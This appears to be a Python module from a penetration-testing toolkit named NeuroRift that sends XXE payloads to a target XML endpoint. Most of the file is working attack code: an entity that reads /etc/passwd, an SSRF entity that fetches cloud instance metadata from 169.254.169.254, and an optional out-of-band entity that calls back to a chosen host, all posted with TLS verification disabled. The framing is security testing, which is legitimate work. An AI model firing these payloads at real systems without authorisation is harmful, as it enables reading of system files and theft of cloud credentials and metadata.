#!/usr/bin/env python3
"""NeuroRift tool: XXE (XML External Entity) injection testing."""

import requests
from tools import ToolResult

SCHEMA = {
    "type": "object",
    "required": ["target"],
    "properties": {
        "target": {
            "type": "string",
            "description": "URL endpoint that accepts XML input",
        },
        "oob_host": {
            "type": "string",
            "description": "OOB callback host for blind XXE",
            "default": "",
        },
    },
}

XXE_FILE_READ = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""

XXE_SSRF = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>"""


class XXETool:
    name = "xxe"
    description = "Test for XML External Entity injection (file read, SSRF, OOB)"

    @staticmethod
    def schema():
        return SCHEMA

    def run(self, target: str, oob_host: str = "") -> ToolResult:
        findings = []
        headers = {"Content-Type": "application/xml"}

        payloads = [
            ("file_read", XXE_FILE_READ),
            ("ssrf", XXE_SSRF),
        ]
        if oob_host:
            oob_xxe = f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob_host}/xxe">]>
<foo>&xxe;</foo>"""
            payloads.append(("oob", oob_xxe))

        for variant, body in payloads:
            try:
                resp = requests.post(
                    target, data=body, headers=headers, timeout=10, verify=False
                )
                indicators = ["root:x", "daemon:", "ami-id", "instance-id"]
                for indicator in indicators:
                    if indicator in resp.text:
                        findings.append(
                            {
                                "type": "xxe",
                                "severity": "CRITICAL",
                                "variant": variant,
                                "indicator": indicator,
                            }
                        )
                        break
            except requests.RequestException:
                continue

        return ToolResult(
            tool_name=self.name,
            target=target,
            success=True,
            findings=findings,
            raw_output=f"Tested {len(payloads)} XXE payloads",
        )
